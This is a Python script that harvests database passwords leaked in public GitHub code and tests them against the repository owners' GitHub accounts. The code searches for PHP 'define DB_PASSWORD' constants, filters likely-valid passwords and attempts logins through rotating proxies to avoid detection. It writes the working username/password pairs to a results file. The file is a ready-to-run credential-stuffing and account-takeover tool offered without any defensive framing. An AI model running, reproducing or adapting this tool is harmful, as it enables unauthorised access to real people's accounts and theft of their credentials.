#!/usr/bin/env python3

import ast
import itertools
import os
import re
import requests
import string
import sys
import time
from requests.adapters import HTTPAdapter
from requests.exceptions import ProxyError
from typing import Callable, Iterable, TextIO, Tuple
from urllib3.util.retry import Retry

API = 'https://api.github.com'
ENV_VAR = 'GITHUB_TOKEN'
HEADERS = {
    'Authorization': 'token ' + os.environ.get(ENV_VAR, ''),
    'Accept': 'application/vnd.github.v3.text-match+json',
}


def validate_login(*auth: Tuple[str, str]) -> bool:
    'Try to login with the username and password.'
    auth = tuple(s.encode('utf-8') for s in auth)
    if not hasattr(validate_login, 'proxy_list'):
        validate_login.proxy_list = itertools.repeat('')
    while True:
        if not hasattr(validate_login, 'proxy'):
            validate_login.proxy = {'https': next(validate_login.proxy_list)}
        try:
            response = requests.get(API, auth=auth, proxies=validate_login.proxy)
            return {200: True, 401: False}[response.status_code]
        except (ProxyError, KeyError) as e:
            progress('!')
        del validate_login.proxy  # move to the next proxy server in the list


def search_code(keywords: str, pause=10) -> Iterable[dict]:
    'Search across all the public repositories.'
    for i in itertools.count():
        params = dict(q=keywords, page=i)
        progress(';')
        time.sleep(pause)
        response = requests.get(API + '/search/code', params, headers=HEADERS)
        result = response.json()
        items = result.get('items')
        if items:
            yield from items
        else:
            print('\n{}: {}\n'.format(keywords, result.get('message', result)))
            return


def credential_stuffing(keywords: str, find: Callable, pause=60) -> Iterable:
    'Test leaked credentials on GitHub.'
    tried_passwords = set()

    for document in search_code(keywords):
        user = document['repository']['owner']['login']

        for match in document['text_matches']:
            password = find(match['fragment'])
            if not password or password in tried_passwords:
                progress('.')
                continue

            tried_passwords.add(password)
            if validate_login(user, password):
                progress('#')
                yield user, password
                break
            else:
                progress(':')
                time.sleep(pause)


def progress(dot='.', file=sys.stdout):
    'Print a progress bar.'
    file.write(dot)
    file.flush()


def find_php_constants(code: str) -> Iterable[Tuple[str, str]]:
    'Extract constant definitions from the code snippet.'
    PATTERN = r'define\s*(\(.+?,.+?\));'
    for match in re.finditer(PATTERN, code):
        try:
            pair = ast.literal_eval(match.group(1))
            assert all(isinstance(i, str) for i in pair)
        except:
            pass
        else:
            yield pair


def find_php_db_password(code: str) -> str:
    'Extract the database password from the code snippet.'
    passwords = set()
    others = set()
    for k, v in find_php_constants(code):
        (passwords if 'PASSWORD' in k.upper() else others).add(v)
    for password in passwords:
        if check_password_strength(password, others):
            return password


def check_password_strength(p: str, others: set) -> bool:
    'Exclude invalid passwords.'
    return not (
        any(i for i in others if p in i or i in p)
        or len(p) < 6
        or all(i == '*' for i in p)
        or all(p in string.digits for i in p)
        or p[0] + p[-1] in ['{}', '[]', '<>']
    )


def set_retry_strategy(prefix='https://', *args, **kwargs):
    'Enable a custom retry strategy.'
    requests.Session.__enter__ = lambda self: self.mount(
        prefix, HTTPAdapter(max_retries=Retry(*args, **kwargs))
    ) or self


def main(patterns: Iterable[Tuple], file: TextIO):
    'Print validated credentials.'
    for pattern in patterns:
        for user, password in credential_stuffing(*pattern):
            print(user, password, file=file)
        print(file=file)


def initialize():
    'Load the configuration from environment variables.'
    if ENV_VAR not in os.environ:
        print('Please provide your %s as an environment variable.' % ENV_VAR)
        return

    tld = '''
        . com org net edu gov me io tk azure amazonaws hostinger
        ru cn com.cn edu.cn tw hk com.hk edu.hk jp co.jp ne.jp in
        uk au us ca mx br ar de fr se nl fi no ch es it
    '''.split()
    patterns = {
        i + ' define DB_PASSWORD': find_php_db_password
        for i in tld
    }

    set_retry_strategy(backoff_factor=1)
    with open(os.environ.get('PROXIES', 'proxies.txt'), encoding='utf-8') as f:
        validate_login.proxy_list = itertools.cycle(f.read().split())
    with open(os.environ.get('RESULTS', 'results.txt'), 'a', 1, 'utf-8') as f:
        main(patterns.items(), f)


if __name__ == '__main__':
    initialize()
